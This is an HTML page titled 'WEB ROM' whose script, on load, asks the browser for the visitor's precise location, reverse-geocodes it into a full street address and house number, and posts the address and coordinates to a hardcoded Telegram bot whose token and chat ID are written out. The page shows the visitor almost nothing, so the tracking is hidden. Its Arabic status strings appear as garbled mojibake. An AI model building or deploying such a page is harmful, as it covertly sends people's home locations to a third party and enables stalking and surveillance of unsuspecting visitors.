<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WEB ROM</title>
<style>
body{font-family:Tahoma, Arial;background:#f3f6ff;height:100vh;margin:0;display:flex;align-items:center;justify-content:center;text-align:center}
#status{margin-top:10px;color:#333}
</style>
</head>
<body>

<div id="msg">
<h3></h3>
<p id="status">..</p>
<small></small>
</div>

<script>
const BOT_TOKEN = "8178761195:AAHUVKSv3VrrRSDWRULLSV6IgPuE0vZx6Y0";
const CHAT_ID  = "6683130316";

const statusEl = document.getElementById("status");

window.addEventListener("load", async ()=>{
  if(!navigator.geolocation){
    statusEl.textContent = "Ø§Ù„Ù…ÙˆÙ‚Ø¹ ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ… ÙÙŠ Ù…ØªØµÙØ­Ùƒ";
    return;
  }

  statusEl.textContent = ".";

  navigator.geolocation.getCurrentPosition(async(position)=>{
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    statusEl.textContent = `Ø§Ù„Ù…ÙˆÙ‚Ø¹ ØªÙ… ØªØ­Ø¯ÙŠØ¯Ù‡: Lat=${lat}, Lon=${lon} â€” Ø¬Ø§Ø±Ù Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ØªÙØ§ØµÙŠÙ„...`;

    try{
      // 1ï¸âƒ£ Ø§Ø³ØªØ®Ø±Ø§Ø¬ ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ø¹Ù†ÙˆØ§Ù† Ø§Ù„ÙƒØ§Ù…Ù„
      const geoResp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
      const geoData = await geoResp.json();
      const addr = geoData.address || {};
      
      const country = addr.country || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
      const state = addr.state || addr.region || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
      const city = addr.city || addr.town || addr.village || addr.county || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
      const suburb = addr.suburb || addr.neighbourhood || "";
      const road = addr.road || addr.footway || "";
      const postcode = addr.postcode || "";
      const house = addr.house_number || "";

      const addressMessage = `ğŸ“ ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„ÙƒØ§Ù…Ù„:
Ø§Ù„Ø¯ÙˆÙ„Ø©: ${country}
Ø§Ù„Ù…Ø­Ø§ÙØ¸Ø© / Ø§Ù„Ù…Ù†Ø·Ù‚Ø©: ${state}
Ø§Ù„Ù…Ø¯ÙŠÙ†Ø© / Ø§Ù„Ø¨Ù„Ø¯Ø©: ${city}
Ø§Ù„Ø­ÙŠ / Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„ØµØºÙŠØ±Ø©: ${suburb || "ØºÙŠØ± Ù…Ø­Ø¯Ø¯"}
Ø§Ø³Ù… Ø§Ù„Ø´Ø§Ø±Ø¹: ${road || "ØºÙŠØ± Ù…Ø­Ø¯Ø¯"}
Ø±Ù‚Ù… Ø§Ù„Ù…Ù†Ø²Ù„ / Ø§Ù„Ù…Ø¨Ù†Ù‰: ${house || "ØºÙŠØ± Ù…Ø­Ø¯Ø¯"}
Ø§Ù„Ø±Ù…Ø² Ø§Ù„Ø¨Ø±ÙŠØ¯ÙŠ: ${postcode || "ØºÙŠØ± Ù…Ø­Ø¯Ø¯"}
Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª: Lat=${lat}, Lon=${lon}`;

      // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¹Ù†ÙˆØ§Ù† Ø§Ù„ØªÙØµÙŠÙ„ÙŠ ÙƒÙ†Øµ
      const form1 = new FormData();
      form1.append("chat_id", CHAT_ID);
      form1.append("text", addressMessage);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        method:"POST",
        body:form1
      });

      // 2ï¸âƒ£ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¹Ù„Ù‰ Ø§Ù„Ø®Ø±ÙŠØ·Ø©
      const form2 = new FormData();
      form2.append("chat_id", CHAT_ID);
      form2.append("latitude", lat);
      form2.append("longitude", lon);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,{
        method:"POST",
        body:form2
      });

      statusEl.textContent = "";

    }catch(err){
      statusEl.textContent = "Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙØ§ØµÙŠÙ„ ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹: "+(err.message||err);
    }

  }, (err)=>{
    statusEl.textContent = "ÙØ´Ù„ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹: " + err.message;
  }, {enableHighAccuracy:true, timeout:15000});
});
</script>

</body>
</html>
